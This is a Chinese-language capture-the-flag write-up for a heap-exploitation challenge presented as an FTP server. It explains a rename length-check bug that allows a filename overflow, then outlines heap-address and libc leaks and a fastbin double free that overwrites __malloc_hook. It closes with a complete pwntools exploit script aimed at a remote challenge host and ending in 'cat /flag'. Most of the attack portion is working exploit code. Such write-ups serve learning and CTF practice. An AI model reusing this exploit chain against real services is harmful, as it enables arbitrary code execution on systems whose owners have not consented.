looooooooooooooooooooooooooong代码

题目说是ftp服务器，其实就是在堆里建链每个文件带固定长度数据。代码长得不可相像，比如put就得用7个分支判断（3个字母大小写和1个空格）然后再判断参数。

数据结构：

        管理块：0x50 文件名:0x28， 大小：8， 数据块指针：8，8字节，下一块指针：8

数据块：长度在puts时输入

命令格式：

- put  filename filesize 随后发送数据（长度由filesize确定）
- rename filename newname 要求字母和.3位扩展名
- dele filename 
- retr filename 就是show会显示文件内容write,0不会被截断

上边这个看明白了就成了。漏洞就1点：修改文件名是对文件名长度没有限制，可以溢出。但由于文件名只能输入字母，所以有点小麻烦。第888行rename中检查目的文件名长度越界时用的原文件名，导致目的文件名长度可溢出。

```cpp
          v51 = strndup(v48, v9 - v48);
          if ( strlen(v50) > 0x1F )             // 目的文件名为v51 但检查时用原文件名v50,导致目的文件名可溢出
          {
            v4 = "300 Destination filename too long.";
            goto LABEL_2;
          }
```

基本思路：

1. 由于用libc-2.23所以建个0x80的块释放就可以得到unsort，所以这里建块ABC，其中B的数据块为0x80，释放B块到unsort
2. 修改A块的文件名，溢出到文件长度的位置用字母覆盖长度使总长度达到B块数据块fd位置
3. 用retr 显示A的文件内容得到堆地址（数据指针和链表指针）和main_arena指针
4. 由于文件名溢出只能是字母，这里造一个块让它的起始位置为XX00它的数据块就是XX50，然后再建个块这个块的指针就指向上一个块XX00，然后修改文件名溢出到链表指针覆盖最后一位为50这样原链表里的XX00就会被XX50代替。XX50是可控的
5. 在后边建两个0x68的块，fastbinattack需要在malloc前错位找标志，这个标志是0x7f，所以需要0x68的块，假设这两块叫A、B，先释放A再释放B，提前在XX50 的fake里将数据指针指向A，再释放XX50时就会再释放A一次形成A-B-A的环
6. 再建0x68四次分别写__malloc_hook-0x23,0,0,\0*(3+8)+(one)+(realloc+n)带realloc调栈的one(这题用one[1]不用调栈就OK了)

完整exp:

```python
from pwn import *
 
local = 0
if local == 1:
    p = process('./pwn')
else:
    p = remote('node4.buuoj.cn', 28840) 
 
libc_elf = ELF('../buuoj_2.23_amd64/libc6_2.23-0ubuntu10_amd64.so')
one = [0x45216, 0x4526a, 0xf02a4, 0xf1147 ]
libc_start_main_ret = 0x20830
 
elf = ELF('./pwn')
context.arch = 'amd64'
context.log_level = 'debug'
 
'''
chunk.head 0x50  name:0x28(overflow) size:8 ptr->data:8 0:8 ptr->next:8
chunk.data size
'''
 
p.sendline(b'put aaa.txt 10') #chunk0 
p.send(b'A'*10)
 
p.sendline(b'put bbb.txt 128') #chunk1 
p.send(b'A'*128)
 
p.sendline(b'put ccc.txt 10') #chunk2 
p.send(b'A'*10)
 
p.sendline(b'rename aaa.txt '+ b'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB.EAx') #chunk0 size=0x78
 
p.sendline(b'dele bbb.txt')
 
p.sendline(b'retr BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB.EAx')
p.recvuntil(b'A'*10)
 
data = p.recv(0x78-10)
heap = u64(data[-0x28:-0x20])
print('heap:', hex(heap))
 
libc_base = u64(data[-8:]) - 0x58 -0x10 - libc_elf.sym['__malloc_hook']
libc_elf.address = libc_base
one_gadget = libc_base + one[1]
print('libc:', hex(libc_base))
 
p.sendline(b'put bbb.txt 128') #chunk1 将原来的fastbin和unsort耗掉
p.send(b'A'*128)
 
p.sendline(b'put null.txt 80') #chunk1 填充让下一块起点尾地址为00
p.send(b'A'*80)
 
 
p.sendline(b'put true.txt 72') #0x48 fake = xxx00
p.send(b'fake.txt'.ljust(0x28, b'\x00')+ flat(0x68, heap+0x350, 0, heap+0x140))  #fake.data = xxx50 data->A.txt.data
p.sendline(b'put ptr.txt 8')   #fake.next = xxx00
p.send(b'A'*8)                
p.sendline(b'put A.txt 104') #chunkA 0x71
p.send(b'A'*104)
p.sendline(b'put B.txt 104') #chunkB 0x71
p.send(b'A'*104)
p.sendline(b'rename ptr.txt '+ b'A.aa'.rjust(0x40, b'A')+ p8(0x50))  #ptr.txt->next=XXX500->XXX550 fake.data 将fake链入链表
 
p.sendline(b'dele fake.txt') #A-B-A
p.sendline(b'dele B.txt')
p.sendline(b'dele A.txt')
p.recv()
 
p.sendline(b'put A.txt 104')
p.send(p64(libc_elf.sym['__malloc_hook'] - 0x23).ljust(0x68, b'\x00'))
p.sendline(b'put B.txt 104')
p.send(p64(0).ljust(0x68, b'\x00'))
p.sendline(b'put C.txt 104')
p.send(p64(0).ljust(0x68, b'\x00'))
p.sendline(b'put D.txt 104')
p.send((b'\x00'*(3+8+8)+ p64(one_gadget) ).ljust(0x68, b'\x00'))
p.recv()
 
p.sendline(b'put E.txt 10')
 
#gdb.attach(p)
#pause()
 
p.sendline(b'cat /flag')
p.interactive()
```